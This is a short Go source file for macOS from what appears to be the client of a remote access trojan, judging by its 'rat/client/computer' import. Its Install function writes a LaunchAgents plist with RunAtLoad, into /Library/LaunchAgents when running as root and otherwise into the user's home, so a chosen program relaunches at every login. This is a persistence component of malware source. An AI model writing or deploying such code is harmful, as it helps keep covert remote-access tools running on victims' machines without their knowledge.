//+build darwin

package startup

import (
	"os"
	"rat/client/computer"
)

func Install(name, path string) error {
	var dir string

	if computer.IsRoot() {
		dir = "/Library/LaunchAgents/"
	} else {
		home := computer.GetComputerInformation().HomeDir
		dir = home + "/Library/LaunchAgents/"
	}

	file, err := os.Create(dir + name + ".plist")
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(`
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>` + name + `</string>
	<key>ProgramArguments</key>
	<array>
		<string>` + path + `</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
	`)

	return err
}
